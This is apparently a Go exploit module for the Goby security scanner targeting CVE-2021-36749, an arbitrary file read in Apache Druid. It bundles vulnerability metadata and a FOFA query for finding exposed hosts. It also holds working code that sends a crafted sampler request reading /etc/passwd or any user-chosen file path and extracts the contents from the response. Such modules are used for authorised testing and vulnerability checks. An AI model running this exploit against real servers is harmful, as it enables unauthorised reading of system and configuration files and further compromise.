package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Apache Druid Arbitrary File Read (CVE-2021-36749)",
    "Description": "<p>Apache Druid is a high performance real-time analytics database.</p><p>Apache Druid </p>",
    "Impact": "Apache Druid Arbitrary File Read (CVE-2021-36749)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://druid.apache.org\">https://druid.apache.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Apache Druid",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache Druid 数据库平台任意文件读取漏洞（CVE-2021-36749）",
            "Description": "<p>Apache Druid是美国阿帕奇软件（Apache）基金会的一款使用Java语言编写的、面向列的开源分布式数据库。</p><p>Apache Druid <= 0.21.1版本存在任意文件读取漏洞，攻击者可获取配置文件等敏感信息，进一步控制系统。</p>",
            "Impact": "<p>Apache Druid <= 0.21.1版本存在任意文件读取漏洞，攻击者可获取配置文件等敏感信息，进一步控制系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://druid.apache.org\">https://druid.apache.org</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Apache Druid",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Apache Druid Arbitrary File Read (CVE-2021-36749)",
            "Description": "<p>Apache Druid is a high performance real-time analytics database.</p><p>Apache Druid <= 0.21.1 version has arbitrary file reading vulnerabilities. Attackers can obtain sensitive information such as configuration files to further control the system.</p>",
            "Impact": "Apache Druid Arbitrary File Read (CVE-2021-36749)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://druid.apache.org\">https://druid.apache.org</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Apache Druid",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"Apache Druid\" && (body=\"console-config.js\" || body=\"www.apache.org\")",
    "GobyQuery": "body=\"Apache Druid\" && (body=\"console-config.js\" || body=\"www.apache.org\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://druid.apache.org",
    "DisclosureDate": "2021-09-25",
    "References": [
        "https://github.com/BrucessKING/CVE-2021-36749"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.5",
    "CVEIDs": [
        "CVE-2021-36749"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202109-1676"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "file:///etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Apache Druid"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10231"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := `/druid/indexer/v1/sampler?for=connect`
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"http\",\"uris\":[\"file:///etc/passwd \"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\", \"parseSpec\":{\"format\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"a\"],\"dimensionsSpec\":{},\"timestampSpec\":{\"column\":\"no_ such_ column\",\"missingValue\":\"2010-01-01T00:00:00Z\"}}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && regexp.MustCompile("root:(.*?):0:0:").MatchString(resp.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/druid/indexer/v1/sampler?for=connect"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "application/json")
			cfg.Data = fmt.Sprintf("{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"http\",\"uris\":[\"%s\"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\", \"parseSpec\":{\"format\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"a\"],\"dimensionsSpec\":{},\"timestampSpec\":{\"column\":\"no_ such_ column\",\"missingValue\":\"2010-01-01T00:00:00Z\"}}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}", cmd)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					BackFile := regexp.MustCompile("(?s){\"a\":\"(.*?)\"},\"parsed\":").FindAllStringSubmatch(resp.RawBody, -1)
					for _, i := range BackFile {
						expResult.Output += i[1] + "\n"
					}
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
